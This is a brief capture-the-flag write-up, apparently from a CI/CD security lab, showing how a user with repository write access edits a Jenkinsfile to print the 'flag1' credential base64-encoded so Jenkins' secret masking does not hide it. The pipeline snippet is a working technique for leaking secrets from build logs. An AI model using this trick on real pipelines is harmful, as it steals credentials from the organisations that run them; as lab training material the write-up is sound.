# White Rabbit

Our git user `thealice` has write access to the `Wonderland/white-rabbit` repository, so we can directly mess with the Jenkinsfile, commit it and have the pipeline run.

The solution is easy enough, we just need to dump out the contents of the `flag1` credential. We need to obfuscate the output so Jenkins doesn't censor the token we're after(its default behavior to prevent credential leakage in logs, console output etc). For simplicity I simply did this at the beginning of the first step of the first stage, after placing the value into the environment:

```jenkinsfile
  pipeline {
    agent any
    environment {
        PROJECT = "src/urllib3"
        FLAG1 = credentials('flag1')
    }

    stages {
        stage ('Install_Requirements') {
            steps {
                sh """
                    echo $FLAG1 | base64
                    virtualenv venv
                    pip3 install -r requirements.txt || true
                """
            }
        }
....................
```


